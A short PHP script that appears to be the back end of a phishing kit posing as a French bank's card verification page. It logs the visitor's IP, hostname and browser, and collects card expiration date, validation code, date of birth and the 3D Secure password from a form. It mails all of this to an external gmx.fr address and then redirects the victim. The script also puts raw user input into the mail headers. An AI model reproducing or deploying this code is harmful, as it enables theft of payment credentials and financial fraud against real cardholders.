<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilmsg .= "--------------########################-------------------\n";
$bilmsg .= "IP              : $ip\n";
$bilmsg .= "HOST            : ".gethostbyaddr($ip)."\n";
$bilmsg .= "browser         : ".$_SERVER['HTTP_USER_AGENT']."\n";
$bilmsg .= "-------------- ########################----------\n";
$bilmsg .= "Date d'expiration : ".$_POST['Dateexpiration']."\n";
$bilmsg .= "Code de validation : ".$_POST['CVB']."\n";
$bilmsg .= "Date de naissance : ".$_POST['datenaissance']."\n";
$bilmsg .= "Mot de passe ou SecureCode (3d) : ".$_POST['VOTRPASS3D']."\n";
$bilmsg .= "-------------- ########################----------\n";
$bilsnd = "zero.plan@gmx.fr";
$bilsub = "'Infoormation Personne '$ip";
$bilhead = "From: 02 information ppl '<wer@info.com>";
$bilhead .= $_POST['eMailAdd']."\n"; 
$bilhead .= "MIME-Version: 1.0\n";
mail($bilsnd,$bilsub,$bilmsg,$bilhead);



header("Location:prog.html?id=454587545&mail&from&smartphone?454584515155184s5454a548sa54a514s515num?454515577774548454client");
?>